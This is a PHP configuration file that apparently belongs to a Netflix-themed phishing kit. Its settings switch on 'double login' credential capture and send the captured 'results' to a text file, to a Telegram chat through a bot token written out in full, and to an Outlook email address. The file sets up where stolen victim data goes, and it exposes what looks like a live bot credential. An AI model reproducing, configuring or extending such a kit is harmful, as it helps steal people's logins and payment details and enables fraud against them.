<?php

$doublelogin="on"; // If you want to use Double Login put on otherwise put off

$doubleemailaccess="off"; // If you want to use Double Emaill Access put on otherwise put off

$saveintotxt="yes"; // If you want to save in txt file put yes otherwise put no
$sendtotelegram="yes"; // If You Want to result on Telegram put yes otherwise put no
$chat_id = "@netflixinfo158"; // Your Telegram Chat ID
$bot_url = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw"; // Your Telegram Bot Api Key
$sendtoemail="yes";// If you want to result on Email put yes otherwise put no
$email = "xmz-productions@outlook.com"; // Your Email Here :)


?>

